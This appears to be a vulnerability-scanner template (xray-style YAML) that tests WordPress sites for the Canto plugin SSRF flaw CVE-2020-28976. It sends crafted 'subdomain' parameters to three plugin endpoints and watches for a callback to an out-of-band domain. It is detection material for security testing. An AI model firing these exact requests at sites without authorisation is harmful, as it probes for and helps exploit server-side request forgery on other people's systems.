name: poc-yaml-wordpress-plugin-canto-cve-2020-28976-ssrf
binding: 3f4ee9d6-e6fb-4d56-b2a2-19e7f3cf9c56
manual: true
detail:
    author: Â∞èz
    links:
        - https://nvd.nist.gov/vuln/detail/CVE-2020-28976
    vulnerability:
        level: medium
transport: http
set:
    reverse: newReverse()
    reurl: reverse.domain
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/canto/includes/lib/detail.php?subdomain={{reurl}}
            follow_redirects: false
        expression: reverse.wait(5)
    r1:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/canto/includes/lib/get.php?subdomain={{reurl}}
            follow_redirects: false
        expression: reverse.wait(5)
    r2:
        request:
            cache: true
            method: GET
            path: /wp-content/plugins/canto/includes/lib/tree.php?subdomain={{reurl}}
            follow_redirects: false
        expression: reverse.wait(5)
expression: r0() || r1() || r2()
